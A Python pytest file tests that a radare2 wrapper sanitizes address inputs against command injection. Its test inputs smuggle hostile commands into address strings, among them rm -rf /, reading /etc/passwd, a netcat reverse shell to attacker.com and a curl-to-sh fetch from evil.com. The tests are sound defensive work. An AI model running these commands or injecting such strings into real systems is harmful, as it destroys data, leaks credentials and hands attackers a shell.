#!/usr/bin/env python3
"""
Security Tests for Radare2 Wrapper

Tests for command injection prevention and input sanitization.
"""

import pytest
import sys
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from packages.binary_analysis.radare2_wrapper import Radare2Wrapper


class TestCommandInjectionPrevention:
    """Test that malicious address inputs are sanitized."""

    @pytest.fixture
    def radare2_wrapper(self, tmp_path):
        """Create a minimal test binary and wrapper."""
        test_binary = tmp_path / "test_prog"
        test_binary.write_bytes(b"\x7fELF" + b"\x00" * 100)

        wrapper = Radare2Wrapper(test_binary)
        return wrapper

    def test_semicolon_in_address_is_sanitized(self, radare2_wrapper):
        """SECURITY: Verify semicolon (command separator) is removed from address."""
        # Attack attempt: "0x1000; ! rm -rf /"
        malicious_address = "0x1000; ! rm -rf /"

        # This should NOT execute the rm command
        # Instead, sanitization should remove the semicolon and shell command
        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = []

            radare2_wrapper.disassemble_at_address(malicious_address, count=10)

            # Verify the dangerous characters were removed from the address
            # After sanitization: "0x1000; ! rm -rf /" -> "0x1000  rm -rf /"
            # The resulting command will be "s 0x1000  rm -rf /; pdj 10"
            # The key is that the semicolon between "s 0x1000  rm -rf /" and "pdj 10"
            # is OUR command separator, not from the attack
            called_command = mock_exec.call_args[0][0]

            # Verify: The address portion should not have ! (shell command)
            # This prevents "! rm" from being executed as shell command
            # After the first 's ' command, there should be no '!' before our 'pdj' command
            parts = called_command.split(';')
            seek_command = parts[0]  # "s 0x1000  rm -rf /"
            assert '!' not in seek_command, \
                f"Shell command operator (!) still in address! Command: {called_command}"

    def test_pipe_in_address_is_sanitized(self, radare2_wrapper):
        """SECURITY: Verify pipe (command separator) is removed from address."""
        malicious_address = "0x1000| cat /etc/passwd"

        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = []

            radare2_wrapper.disassemble_at_address(malicious_address, count=10)

            called_command = mock_exec.call_args[0][0]
            assert '|' not in called_command.split('0x1000')[1], \
                "Pipe not sanitized!"

    def test_exclamation_in_address_is_sanitized(self, radare2_wrapper):
        """SECURITY: Verify exclamation (shell command) is removed from address."""
        # radare2 uses ! for shell commands
        malicious_address = "0x1000! whoami"

        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = []

            radare2_wrapper.disassemble_at_address(malicious_address, count=10)

            called_command = mock_exec.call_args[0][0]
            assert '!' not in called_command.split('0x1000')[1], \
                "Exclamation not sanitized!"

    def test_multiple_separators_all_sanitized(self, radare2_wrapper):
        """SECURITY: Verify all command separators removed together."""
        malicious_address = "0x1000; | ! echo pwned"

        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = []

            radare2_wrapper.disassemble_at_address(malicious_address, count=10)

            called_command = mock_exec.call_args[0][0]
            # After sanitization: "0x1000; | ! echo pwned" -> "0x1000   echo pwned"
            # Check the seek command (first part before our ; separator to pdj)
            parts = called_command.split(';')
            seek_command = parts[0]  # "s 0x1000   echo pwned"
            # Verify no dangerous characters in the address portion
            assert '|' not in seek_command, "Pipe still in address!"
            assert '!' not in seek_command, "Shell operator still in address!"

    def test_disassemble_function_sanitizes_address(self, radare2_wrapper):
        """SECURITY: Verify disassemble_function() also sanitizes."""
        malicious_address = "main; ! ls"

        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = {}

            radare2_wrapper.disassemble_function(malicious_address)

            called_command = mock_exec.call_args[0][0]
            assert ';' not in called_command.split('main')[1], \
                "disassemble_function doesn't sanitize!"

    def test_get_xrefs_to_sanitizes_address(self, radare2_wrapper):
        """SECURITY: Verify get_xrefs_to() also sanitizes."""
        malicious_address = "0x401000; ! cat /etc/passwd"

        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = []

            radare2_wrapper.get_xrefs_to(malicious_address)

            called_command = mock_exec.call_args[0][0]
            assert ';' not in called_command.split('0x401000')[1], \
                "get_xrefs_to doesn't sanitize!"

    def test_get_xrefs_from_sanitizes_address(self, radare2_wrapper):
        """SECURITY: Verify get_xrefs_from() also sanitizes."""
        malicious_address = "0x401000; ! wget evil.com/malware"

        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = []

            radare2_wrapper.get_xrefs_from(malicious_address)

            called_command = mock_exec.call_args[0][0]
            assert ';' not in called_command.split('0x401000')[1], \
                "get_xrefs_from doesn't sanitize!"

    def test_get_call_graph_sanitizes_address(self, radare2_wrapper):
        """SECURITY: Verify get_call_graph() also sanitizes."""
        malicious_address = "main; ! nc -e /bin/sh attacker.com 4444"

        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = {}

            radare2_wrapper.get_call_graph(malicious_address)

            called_command = mock_exec.call_args[0][0]
            assert ';' not in called_command.split('main')[1], \
                "get_call_graph doesn't sanitize!"

    def test_decompile_function_sanitizes_address(self, radare2_wrapper):
        """SECURITY: Verify decompile_function() also sanitizes."""
        malicious_address = "main; ! curl http://evil.com | sh"

        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = {"raw_output": ""}

            radare2_wrapper.decompile_function(malicious_address)

            called_command = mock_exec.call_args[0][0]
            assert ';' not in called_command.split('main')[1], \
                "decompile_function doesn't sanitize!"


class TestAddressValidation:
    """Test that addresses are validated for correct format."""

    @pytest.fixture
    def radare2_wrapper(self, tmp_path):
        """Create a minimal test binary and wrapper."""
        test_binary = tmp_path / "test_prog"
        test_binary.write_bytes(b"\x7fELF" + b"\x00" * 100)

        wrapper = Radare2Wrapper(test_binary)
        return wrapper

    def test_valid_hex_address_accepted(self, radare2_wrapper):
        """SECURITY: Verify valid hex addresses are accepted."""
        valid_addresses = [
            "0x401000",
            "0x1000",
            "0xdeadbeef",
            "0xFFFFFFFF",
        ]

        for address in valid_addresses:
            with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
                mock_exec.return_value = []

                # Should not raise exception
                radare2_wrapper.disassemble_at_address(address, count=1)

    def test_valid_symbol_name_accepted(self, radare2_wrapper):
        """SECURITY: Verify valid symbol names are accepted."""
        valid_symbols = [
            "main",
            "sym.main",
            "fcn.00401000",
            "_start",
        ]

        for symbol in valid_symbols:
            with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
                mock_exec.return_value = {}

                # Should not raise exception
                radare2_wrapper.disassemble_function(symbol)

    def test_sanitize_helper_is_idempotent(self, radare2_wrapper):
        """SECURITY: Verify sanitization doesn't break valid addresses."""
        # If sanitize is called twice, result should be same
        valid_address = "0x401000"

        # Call twice - should still work
        with patch.object(radare2_wrapper, '_execute_command') as mock_exec:
            mock_exec.return_value = []

            radare2_wrapper.disassemble_at_address(valid_address, count=1)
            first_call = mock_exec.call_args[0][0]

            radare2_wrapper.disassemble_at_address(valid_address, count=1)
            second_call = mock_exec.call_args[0][0]

            assert first_call == second_call, "Sanitization not idempotent!"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
